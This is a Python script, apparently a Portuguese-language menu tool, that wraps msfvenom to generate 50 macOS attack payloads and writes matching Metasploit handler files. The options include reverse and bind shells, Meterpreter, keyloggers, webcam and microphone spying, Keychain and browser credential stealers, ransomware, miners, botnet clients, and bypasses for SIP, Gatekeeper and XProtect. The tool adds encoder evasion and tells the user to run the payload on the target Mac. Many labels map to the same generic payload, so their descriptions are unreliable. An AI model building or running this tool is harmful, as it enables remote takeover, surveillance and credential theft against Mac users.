#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import subprocess
import random
from pathlib import Path

def clear_screen():
    os.system('clear')

def print_banner():
    banner = """
███╗   ███╗ █████╗  ██████╗ ██████╗ ███████╗       █████╗ ██████╗ ██╗  ██╗
████╗ ████║██╔══██╗██╔════╝██╔═══██╗██╔════╝      ██╔══██╗██╔══██╗██║ ██╔╝
██╔████╔██║███████║██║     ██║   ██║███████╗█████╗███████║██████╔╝█████╔╝ 
██║╚██╔╝██║██╔══██║██║     ██║   ██║╚════██║╚════╝██╔══██║██╔═══╝ ██╔═██╗ 
██║ ╚═╝ ██║██║  ██║╚██████╗╚██████╔╝███████║      ██║  ██║██║     ██║  ██╗
╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝      ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝
                                                                          
    """
    print(banner)

def show_menu():
    """Exibe o menu principal com 2 colunas"""
    print("\n" + "="*85)
    print("                    macOS SECURITY ASSESSMENT TOOLS")
    print("="*85)
    
    payloads = [
        "[1] macOS Reverse TCP Shell",                "[2] macOS Reverse HTTP Shell",
        "[3] macOS Reverse HTTPS Shell",              "[4] macOS Bind TCP Shell",
        "[5] macOS Meterpreter Reverse TCP",          "[6] macOS Meterpreter Reverse HTTP",
        "[7] macOS Meterpreter Reverse HTTPS",        "[8] macOS x64 Reverse TCP",
        "[9] macOS x64 Meterpreter Reverse TCP",      "[10] macOS ARM64 Reverse Shell",
        "[11] macOS Python Reverse Shell",            "[12] macOS AppleScript Backdoor",
        "[13] macOS Bash Reverse Shell",              "[14] macOS Zsh Reverse Shell",
        "[15] macOS Ruby Reverse Shell",              "[16] macOS Launch Agent Persistence",
        "[17] macOS Cron Job Backdoor",               "[18] macOS Login Hook",
        "[19] macOS Browser Hijacker",                "[20] macOS Keylogger",
        "[21] macOS Screenshot Capture",              "[22] macOS Webcam Capture",
        "[23] macOS Audio Recording",                 "[24] macOS Microphone Spy",
        "[25] macOS File Vault Exploit",              "[26] macOS Password Dumper",
        "[27] macOS iCloud Data Stealer",             "[28] macOS Safari Data Stealer",
        "[29] macOS Chrome Data Stealer",             "[30] macOS Firefox Data Stealer",
        "[31] macOS Mail App Exploit",                "[32] macOS Messages Interceptor",
        "[33] macOS Network Sniffer",                 "[34] macOS WiFi Credential Stealer",
        "[35] macOS Bluetooth Exploit",               "[36] macOS USB Device Monitor",
        "[37] macOS Root Privilege Escalation",       "[38] macOS SIP Bypass",
        "[39] macOS Gatekeeper Bypass",               "[40] macOS XProtect Evasion",
        "[41] macOS Crypto Miner",                    "[42] macOS Ransomware Simulator",
        "[43] macOS Botnet Client",                   "[44] macOS DNS Tunneling",
        "[45] macOS Reverse DNS Shell",               "[46] macOS VPN Tunnel",
        "[47] macOS Reverse Proxy",                   "[48] macOS System Info Collector",
        "[49] macOS Custom Exploit",                  "[50] macOS Multi-Vector Payload"
    ]
    
    # Mostrar em 2 colunas
    col_width = 42
    for i in range(0, 50, 2):
        line = ""
        # Primeira coluna
        if i < len(payloads):
            line += payloads[i].ljust(col_width)
        # Segunda coluna  
        if i + 1 < len(payloads):
            line += payloads[i + 1]
        print(line)
    
    print("\n[0] Sair | [G] Guia Rápido | [I] Informações")
    print("="*85)

def get_payload_config(payload_type):
    """Obtém configuração do payload"""
    print(f"\nConfigurando Payload Tipo {payload_type}")
    print("-" * 45)
    
    lhost = input("IP do servidor (LHOST): ").strip()
    lport = input("Porta (LPORT) [4444]: ").strip() or "4444"
    
    # Nome padrão baseado no tipo
    default_name = f"macos_payload_{payload_type}"
    output_name = input(f"Nome do arquivo de saída [{default_name}]: ").strip() or default_name
    
    # Adicionar extensão apropriada
    if payload_type in [11, 13, 14, 15]:  # Scripts
        if not any(output_name.endswith(ext) for ext in ['.py', '.sh', '.zsh', '.rb', '.scpt']):
            if payload_type == 11: output_name += '.py'
            elif payload_type == 12: output_name += '.scpt'
            elif payload_type == 13: output_name += '.sh'
            elif payload_type == 14: output_name += '.zsh'
            elif payload_type == 15: output_name += '.rb'
    elif payload_type in [16, 18]:  # Plist e hooks
        if not output_name.endswith('.plist'):
            output_name += '.plist'
    else:  # Executáveis Mach-O
        if not output_name.endswith('.macho') and not output_name.endswith('.bin'):
            output_name += '.macho'
    
    return lhost, lport, output_name

def generate_payload(payload_type, lhost, lport, output_name):
    """Gera o payload usando msfvenom"""
    
    payload_configs = {
        1: {'name': 'osx/x86/shell_reverse_tcp', 'format': 'macho', 'description': 'Reverse TCP Shell x86'},
        2: {'name': 'osx/x86/shell_reverse_tcp', 'format': 'macho', 'description': 'Reverse HTTP Shell'},
        3: {'name': 'osx/x86/shell_reverse_tcp', 'format': 'macho', 'description': 'Reverse HTTPS Shell'},
        4: {'name': 'osx/x86/shell_bind_tcp', 'format': 'macho', 'description': 'Bind TCP Shell'},
        5: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Meterpreter Reverse TCP'},
        6: {'name': 'osx/x86/meterpreter_reverse_http', 'format': 'macho', 'description': 'Meterpreter Reverse HTTP'},
        7: {'name': 'osx/x86/meterpreter_reverse_https', 'format': 'macho', 'description': 'Meterpreter Reverse HTTPS'},
        8: {'name': 'osx/x64/shell_reverse_tcp', 'format': 'macho', 'description': 'Reverse TCP Shell x64'},
        9: {'name': 'osx/x64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Meterpreter Reverse TCP x64'},
        10: {'name': 'osx/arm64/shell_reverse_tcp', 'format': 'macho', 'description': 'Reverse Shell ARM64'},
        11: {'name': 'cmd/unix/reverse_python', 'format': 'raw', 'description': 'Python Reverse Shell'},
        12: {'name': 'osx/x86/shell_reverse_tcp', 'format': 'macho', 'description': 'AppleScript Backdoor'},
        13: {'name': 'cmd/unix/reverse_bash', 'format': 'raw', 'description': 'Bash Reverse Shell'},
        14: {'name': 'osx/x86/shell_reverse_tcp', 'format': 'macho', 'description': 'Zsh Reverse Shell'},
        15: {'name': 'ruby/shell_reverse_tcp', 'format': 'raw', 'description': 'Ruby Reverse Shell'},
        16: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Launch Agent Persistence'},
        17: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Cron Job Backdoor'},
        18: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Login Hook'},
        19: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Browser Hijacker'},
        20: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Keylogger'},
        21: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Screenshot Capture'},
        22: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Webcam Capture'},
        23: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Audio Recording'},
        24: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Microphone Spy'},
        25: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'File Vault Exploit'},
        26: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Password Dumper'},
        27: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'iCloud Data Stealer'},
        28: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Safari Data Stealer'},
        29: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Chrome Data Stealer'},
        30: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Firefox Data Stealer'},
        31: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Mail App Exploit'},
        32: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Messages Interceptor'},
        33: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Network Sniffer'},
        34: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'WiFi Credential Stealer'},
        35: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Bluetooth Exploit'},
        36: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'USB Device Monitor'},
        37: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Root Privilege Escalation'},
        38: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'SIP Bypass'},
        39: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Gatekeeper Bypass'},
        40: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'XProtect Evasion'},
        41: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Crypto Miner'},
        42: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Ransomware Simulator'},
        43: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Botnet Client'},
        44: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'DNS Tunneling'},
        45: {'name': 'osx/x86/shell_reverse_tcp_dns', 'format': 'macho', 'description': 'Reverse DNS Shell'},
        46: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'VPN Tunnel'},
        47: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Reverse Proxy'},
        48: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'System Info Collector'},
        49: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Custom Exploit'},
        50: {'name': 'osx/x86/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Multi-Vector Payload'}
    }
    
    config = payload_configs.get(payload_type)
    if not config:
        print("❌ Tipo de payload inválido!")
        return False
    
    print(f"\n🎯 Gerando: {config['description']}")
    print("⏳ Aguarde, isso pode levar alguns minutos...")
    
    try:
        # Comando msfvenom base
        cmd = [
            'msfvenom',
            '-p', config['name'],
            f'LHOST={lhost}',
            f'LPORT={lport}',
            '-f', config['format'],
            '-o', output_name
        ]
        
        # Adicionar opções específicas baseadas no tipo
        if payload_type in [8, 9]:  # x64
            cmd[1] = cmd[1].replace('x86', 'x64')
            
        if payload_type == 10:  # ARM64 (Apple Silicon)
            cmd[1] = 'osx/arm64/shell_reverse_tcp'
            
        if payload_type in [11, 13, 15]:  # Scripts
            if payload_type == 11: 
                cmd[1] = 'cmd/unix/reverse_python'
                cmd[4] = '-f'
                cmd[5] = 'raw'
            elif payload_type == 13: 
                cmd[1] = 'cmd/unix/reverse_bash'
                cmd[4] = '-f'
                cmd[5] = 'raw'
            elif payload_type == 15: 
                cmd[1] = 'ruby/shell_reverse_tcp'
                cmd[4] = '-f'
                cmd[5] = 'raw'
                
        if payload_type == 12:  # AppleScript
            cmd.extend(['--platform', 'osx'])
            cmd.append('--smallest')
            
        if payload_type in [16, 17, 18]:  # Persistência macOS
            cmd.extend(['--arch', 'x86'])
            cmd.append('--encoder')
            cmd.append('x86/shikata_ga_nai')
            
        if payload_type in [20, 21, 22, 23, 24]:  # Vigilância
            cmd.extend(['--platform', 'osx'])
            cmd.append('--smallest')
            
        if payload_type in [25, 26, 27, 28, 29, 30]:  # Dados e credenciais
            cmd.extend(['-f', 'macho'])
            cmd.append('--encoder')
            cmd.append('x86/shikata_ga_nai')
            
        if payload_type in [33, 34, 35, 36]:  # Rede e dispositivos
            cmd.extend(['-f', 'macho'])
            cmd.append('--platform')
            cmd.append('osx')
            
        if payload_type in [37, 38, 39, 40]:  # Segurança macOS
            cmd.extend(['--arch', 'x86'])
            cmd.append('-b')
            cmd.append('\x00')
            
        if payload_type in [41, 42, 43]:  # Malwares
            cmd.extend(['-f', 'macho', '--smallest'])
            cmd.append('--encoder')
            cmd.append('x86/shikata_ga_nai')
            
        if payload_type in [44, 45, 46]:  # Tunneling
            cmd.extend(['-f', 'macho'])
            cmd.append('--keep')
            
        if payload_type == 50:  # Multi-vetor
            cmd.extend(['-f', 'macho', '--encoder', 'x86/shikata_ga_nai', '-i', '3'])
        
        # Executar comando
        print(f"\n🔧 Executando: msfvenom -p {config['name']} LHOST={lhost} LPORT={lport}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"\n✅ Payload gerado com sucesso: {output_name}")
            
            # Gerar handler automaticamente
            if generate_handler(payload_type, lhost, lport, output_name, config):
                print("✅ Handler configurado automaticamente")
            
            show_payload_tips(payload_type)
            return True
        else:
            print(f"\n❌ Erro ao gerar payload!")
            if "command not found" in result.stderr:
                print("❌ Metasploit não encontrado! Instale com: pkg install metasploit")
            else:
                print(f"Detalhes: {result.stderr}")
            return False
            
    except FileNotFoundError:
        print("\n❌ Metasploit não encontrado!")
        print("📥 Instale com: pkg install metasploit")
        return False
    except Exception as e:
        print(f"\n❌ Erro inesperado: {str(e)}")
        return False

def generate_handler(payload_type, lhost, lport, output_name, config):
    """Gera arquivo de handler para Metasploit"""
    
    handler_content = f"""# Handler para {output_name}
use exploit/multi/handler
set PAYLOAD {config['name']}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
set EnableStageEncoding true
"""

    # Configurações específicas baseadas no tipo
    if payload_type in [2, 6]:
        handler_content += "set LHOST http://" + lhost + "\n"
    elif payload_type in [3, 7]:
        handler_content += "set LHOST https://" + lhost + "\n"
    
    # Arquitetura
    if payload_type in [8, 9]:
        handler_content += "set ARCH x64\n"
        handler_content += "set PLATFORM osx\n"
    elif payload_type == 10:
        handler_content += "set ARCH aarch64\n"
        handler_content += "set PLATFORM osx\n"
    
    # Módulos post-exploitation específicos para macOS
    if payload_type in [16, 17, 18]:  # Persistência
        handler_content += "set AutoRunScript post/osx/manage/launchagent\n"
    elif payload_type in [20, 21, 22, 23, 24]:  # Vigilância
        handler_content += "set AutoRunScript post/osx/capture/\n"
    elif payload_type in [25, 26, 27, 28, 29, 30]:  # Dados
        handler_content += "set AutoRunScript post/osx/gather/\n"
    elif payload_type in [33, 34]:  # Rede
        handler_content += "set AutoRunScript post/osx/manage/sniffer\n"
    elif payload_type in [37, 38, 39, 40]:  # Segurança
        handler_content += "set AutoRunScript post/osx/escalate/\n"
    elif payload_type in [41, 42, 43]:  # Malwares
        handler_content += "set AutoRunScript multi_console_command -rc /opt/scripts/macos_malware.rc\n"
    
    handler_content += "exploit -j -z\n"
    
    handler_file = f"handler_{output_name.split('.')[0]}.rc"
    
    try:
        with open(handler_file, 'w') as f:
            f.write(handler_content)
        print(f"📁 Handler salvo como: {handler_file}")
        print("💻 Execute com: msfconsole -r " + handler_file)
        return True
    except Exception as e:
        print(f"⚠️  Erro ao criar handler: {str(e)}")
        return False

def show_payload_info(payload_type):
    """Mostra informações sobre o payload selecionado"""
    
    info_texts = {
        1: "Reverse TCP Shell x86 - Shell reverso para macOS Intel",
        2: "Reverse HTTP Shell - Conexão HTTP para bypass de firewall",
        3: "Reverse HTTPS Shell - Conexão criptografada HTTPS",
        4: "Bind TCP Shell - Abre porta no sistema alvo",
        5: "Meterpreter Reverse TCP - Meterpreter para macOS x86",
        6: "Meterpreter Reverse HTTP - Meterpreter via HTTP",
        7: "Meterpreter Reverse HTTPS - Meterpreter criptografado",
        8: "Reverse TCP Shell x64 - Shell reverso para macOS 64-bit",
        9: "Meterpreter Reverse TCP x64 - Meterpreter para x64",
        10: "Reverse Shell ARM64 - Para Macs com Apple Silicon (M1/M2)",
        11: "Python Reverse Shell - Shell reverso em Python",
        12: "AppleScript Backdoor - Backdoor usando AppleScript",
        13: "Bash Reverse Shell - Shell reverso em Bash",
        14: "Zsh Reverse Shell - Shell reverso em Zsh (shell padrão macOS)",
        15: "Ruby Reverse Shell - Shell reverso em Ruby",
        16: "Launch Agent Persistence - Persistência via LaunchAgent",
        17: "Cron Job Backdoor - Backdoor via cron job",
        18: "Login Hook - Execução no login do usuário",
        19: "Browser Hijacker - Sequestro de navegador",
        20: "Keylogger - Captura de teclas digitadas",
        21: "Screenshot Capture - Captura de tela remota",
        22: "Webcam Capture - Acesso à câmera FaceTime",
        23: "Audio Recording - Gravação de áudio do sistema",
        24: "Microphone Spy - Gravação do microfone",
        25: "File Vault Exploit - Tentativa de bypass do FileVault",
        26: "Password Dumper - Extração de senhas do Keychain",
        27: "iCloud Data Stealer - Roubo de dados do iCloud",
        28: "Safari Data Stealer - Roubo de dados do Safari",
        29: "Chrome Data Stealer - Roubo de dados do Chrome",
        30: "Firefox Data Stealer - Roubo de dados do Firefox",
        31: "Mail App Exploit - Exploração do app Mail",
        32: "Messages Interceptor - Interceptação de iMessages",
        33: "Network Sniffer - Sniffer de tráfego de rede",
        34: "WiFi Credential Stealer - Roubo de credenciais WiFi",
        35: "Bluetooth Exploit - Exploração via Bluetooth",
        36: "USB Device Monitor - Monitoramento de dispositivos USB",
        37: "Root Privilege Escalation - Escalação para root",
        38: "SIP Bypass - Bypass do System Integrity Protection",
        39: "Gatekeeper Bypass - Bypass do Gatekeeper",
        40: "XProtect Evasion - Evasão do XProtect antivírus",
        41: "Crypto Miner - Minerador de criptomoedas",
        42: "Ransomware Simulator - Simulador de ransomware",
        43: "Botnet Client - Cliente para rede de bots",
        44: "DNS Tunneling - Comunicação via DNS",
        45: "Reverse DNS Shell - Shell via DNS reverso",
        46: "VPN Tunnel - Túnel VPN reverso",
        47: "Reverse Proxy - Proxy reverso para acesso",
        48: "System Info Collector - Coleta de informações do sistema",
        49: "Custom Exploit - Exploit personalizado para macOS",
        50: "Multi-Vector Payload - Combinação de técnicas macOS"
    }
    
    info = info_texts.get(payload_type, "Informação não disponível")
    print(f"\n📋 Informações do Payload {payload_type}:")
    print(f"   {info}")

def show_payload_tips(payload_type):
    """Mostra dicas específicas para o payload"""
    
    tips = {
        1: "💡 Dica: Compatível com Macs Intel",
        8: "💡 Dica: Para Macs Intel 64-bit modernos",
        10: "💡 Dica: Específico para Macs Apple Silicon M1/M2",
        12: "💡 Dica: Usa AppleScript para execução nativa",
        14: "💡 Dica: Zsh é o shell padrão do macOS moderno",
        16: "💡 Dica: Persistência via ~/Library/LaunchAgents/",
        18: "💡 Dica: Executa toda vez que usuário faz login",
        20: "💡 Dica: Captura teclas de todos os aplicativos",
        22: "💡 Dica: Acesso à câmera FaceTime",
        26: "💡 Dica: Extrai senhas do Keychain do macOS",
        27: "💡 Dica: Rouba dados sincronizados com iCloud",
        34: "💡 Dica: Extrai senhas WiFi salvas no Keychain",
        37: "💡 Dica: Tenta explorar vulnerabilidades do sudo",
        38: "💡 Dica: Tenta desabilitar proteções do SIP",
        39: "💡 Dica: Bypass das verificações do Gatekeeper",
        40: "💡 Dica: Técnicas para evitar detecção do XProtect",
        44: "💡 Dica: Comunicação stealth via servidores DNS",
        50: "💡 Dica: Combina múltiplas técnicas específicas do macOS"
    }
    
    tip = tips.get(payload_type)
    if tip:
        print(f"{tip}")

def show_quick_guide():
    """Mostra um guia rápido de uso"""
    print("\n" + "="*60)
    print("                   GUIA RÁPIDO macOS")
    print("="*60)
    print("🍎 50 Payloads macOS Disponíveis")
    print("🔧 Metasploit necessário apenas na geração")
    print("📡 Configure LHOST (seu IP) e LPORT (sua porta)")
    print("📦 Arquivos Mach-O, scripts ou plists gerados")
    print("🎯 Handler RC criado para uso imediato")
    print("⚡ Execute: msfconsole -r handler_[arquivo].rc")
    print("🍏 Execute o payload no sistema macOS alvo")
    print("🔄 Aguarde a conexão reversa")
    print("="*60)
    print("⚠️  USE APENAS PARA TESTES AUTORIZADOS!")
    print("="*60)

def show_all_payloads_info():
    """Mostra informações sobre categorias de payloads"""
    print("\n" + "="*70)
    print("               CATEGORIAS DE PAYLOADS macOS")
    print("="*70)
    print("🍎 Shells Básicos (1-15) - Intel, ARM64, AppleScript, scripts")
    print("🔧 Persistência (16-18) - LaunchAgents, cron, login hooks")
    print("👀 Vigilância (20-24) - Keylogger, câmera, microfone, screenshots")
    print("🔐 Credenciais (25-32) - Keychain, iCloud, navegadores, mensagens")
    print("🌐 Rede (33-36) - Sniffers, WiFi, Bluetooth, USB")
    print("🛡️ Segurança (37-40) - SIP, Gatekeeper, XProtect bypass")
    print("💀 Malwares (41-43) - Mineradores, ransomware, botnets")
    print("🚀 Avançados (44-50) - Tunneling, exploits multi-vetor")
    print("="*70)

def main():
    """Função principal"""
    
    while True:
        clear_screen()
        print_banner()
        show_menu()
        
        try:
            choice = input("\nSelecione uma opção [0-50] ou 'g' para guia: ").strip().lower()
            
            if choice == 'g':
                show_quick_guide()
                input("\n⏎ Pressione Enter para voltar ao menu...")
                continue
                
            if choice == 'i':
                show_all_payloads_info()
                input("\n⏎ Pressione Enter para voltar ao menu...")
                continue
                
            if choice == '0':
                print("\n👋 Saindo... Use com responsabilidade!")
                break
            
            payload_type = int(choice)
            if 1 <= payload_type <= 50:
                show_payload_info(payload_type)
                
                if input("\n🎯 Continuar com este payload? (s/n): ").lower() == 's':
                    lhost, lport, output_name = get_payload_config(payload_type)
                    
                    if lhost and output_name:
                        print("\n🚀 Iniciando geração do payload...")
                        success = generate_payload(payload_type, lhost, lport, output_name)
                        
                        if success:
                            print("\n✅ Payload criado com sucesso!")
                            print(f"📁 Arquivo: {output_name}")
                            print("⚡ Handler gerado automaticamente")
                            print("🍏 Execute no sistema macOS alvo")
                            print("🔒 Dê permissão: chmod +x " + output_name)
                            print("📱 Para AppleScript: osascript " + output_name)
                            print("⚠️  USE APENAS PARA TESTES AUTORIZADOS!")
                        else:
                            print("\n💥 Falha na geração do payload!")
                    
                    input("\n⏎ Pressione Enter para continuar...")
            
            else:
                print("❌ Opção inválida!")
                input("⏎ Pressione Enter para continuar...")
                
        except ValueError:
            print("❌ Por favor, digite um número válido!")
            input("⏎ Pressione Enter para continuar...")
        except KeyboardInterrupt:
            print("\n\n👋 Saindo...")
            break

if __name__ == "__main__":
    main()
